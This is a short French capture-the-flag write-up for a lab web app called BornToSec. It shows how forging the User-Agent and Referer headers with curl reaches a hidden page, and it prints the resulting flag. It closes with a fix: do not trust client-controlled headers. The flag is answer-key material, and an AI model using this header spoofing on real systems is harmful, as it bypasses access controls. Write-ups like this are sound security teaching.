# User-Agent Bypass

## Exploitation

En bas de la page princpal, il y a un lien `BornToSec`:

```html
<a href="?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"><li>&copy; BornToSec</li></a>
```

http://192.168.122.55/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c

right clic -> examiner la cible -> read source code

On trouve un commentaire :

```
You must cumming from : "https://www.nsa.gov/" to go to the next step
Let's use this browser : "ft_bornToSec". It will help you a lot.
```

On va donc modifier notre requete avec ce `User-Agent` et ce `Referer`:

```bash
$> curl 'http://192.168.99.100/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
-H 'User-Agent: ft_bornToSec' \
-H 'Referer: https://www.nsa.gov/' | grep flag

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 
```

## Resolution

Ne pas mettre de conditionnel sur le `User-Agent` ou le `Referer` pour acceder a des donnees sensibles car n'importe quel utilisateur peut les modifier dans sa requete.
